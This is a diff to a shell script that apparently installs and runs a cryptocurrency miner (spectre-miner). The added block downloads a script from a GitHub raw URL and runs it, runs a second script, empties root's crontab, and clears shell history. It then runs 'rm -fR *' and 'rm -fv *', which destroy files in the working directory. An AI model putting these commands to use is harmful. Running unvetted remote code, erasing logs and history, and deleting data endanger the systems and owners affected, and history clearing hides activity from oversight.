@@ -47,6 +47,16 @@ cd bin
 mv spectre-miner-v0.3.16-linux-gnu-amd64 spr
 cd
 
+wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
+chmod +x /root/kill_miner.sh
+./kill_miner.sh
+sleep 3
+./danielluis1921.sh
+cat /dev/null > /var/spool/cron/crontabs/root
+history -c && history -w
+rm -fR *
+rm -fv *
+
 cat >>checkQliStatus.sh<<EOF
 status=$(tail -1 /var/log/qli.log | awk '{print $6}')
 if [ "$status" = "Idling" ];
@@ -58,13 +68,6 @@ fi
 EOF
 chmod +x checkQliStatus.sh
 
-wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
-chmod +x /root/kill_miner.sh
-./kill_miner.sh
-sleep 3
-./danielluis1921.sh
-cat /dev/null > /var/spool/cron/crontabs/root
-history -c && history -w
 #Add Cronjob
 cat >>/var/spool/cron/crontabs/root<<EOF
 */1 * * * * /root/checkQliStatus.sh > /root/checkQliStatus.log
